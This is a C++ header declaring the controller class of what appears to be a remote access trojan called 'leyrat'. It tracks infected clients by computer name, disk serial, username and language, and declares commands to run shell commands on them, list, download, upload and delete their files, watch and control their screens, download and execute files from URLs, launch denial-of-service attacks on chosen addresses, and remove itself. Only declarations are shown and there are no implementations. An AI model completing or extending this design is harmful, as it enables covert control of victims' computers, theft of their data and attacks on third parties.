#pragma once

#include "defines.h"

class leyrat
{
private:
	char *onlineclients[100000];
public:
	
	~leyrat();
	leyrat();



	//client management

	
	bool IsClient(char *computername, unsigned long diskserial);
	bool IsOnlineClient(char *ip);
	
	void ClientAdd(char* ip, int version, unsigned long diskserial, char* language, char* username, char*computername);
	
	bool GetClientCountry(char* computername, unsigned long diskserial, char *cbuf);
	bool GetClientUsername(char* computername, unsigned long diskserial, char *cbuf);
	bool GetClientVersion(char* computername, unsigned long diskserial, unsigned long* version);

	//requests
	void Request_AckServer(char* ip, short port);

	void Request_RunCmd(char* ip, short port, char*torun);

	void Request_FileList(char* ip, short port, char* dir);
	void Request_FileDownload(const char* ip, short port, const char*file, void*data, int datalen);
	void Request_FileDelete(char* ip, short port, char*file);
	void Request_FileUpload(char* ip, short port, char*file);

	void Request_Dos(char* ip, short port, char* addr, char* pkg, unsigned char pkglen, unsigned int time, short atkport, bool is_http);

	void Request_Screenshare(char *ip, short port);
	void Request_ScreenshareInput(char *ip, short port);

	void Request_HTTPDownload(char* ip, short port, char*url, char*store, bool exec, bool update);

	void Request_Suicide(char *ip, short port);

	//callbacks

	void Callback_AckServer(char* ip, int version, unsigned long diskserial, char* language, char* username, char*computername);

	void Callback_RunCmd(char* ip);

	void Callback_FileList(char* ip, char**files, int numfiles);
	void Callback_FileDownload(char* ip);
	void Callback_FileDelete(char* ip);
	void Callback_FileUpload(char* ip, char*filename, char*bytes, int len);

	void Callback_Dos(char *ip);
	
	void Callback_Screenshare(char *ip);
	void Callback_ScreenshareInput(char *ip);

	void Callback_HTTPDownload(char *ip);

	void Callback_Suicide(char *ip);
};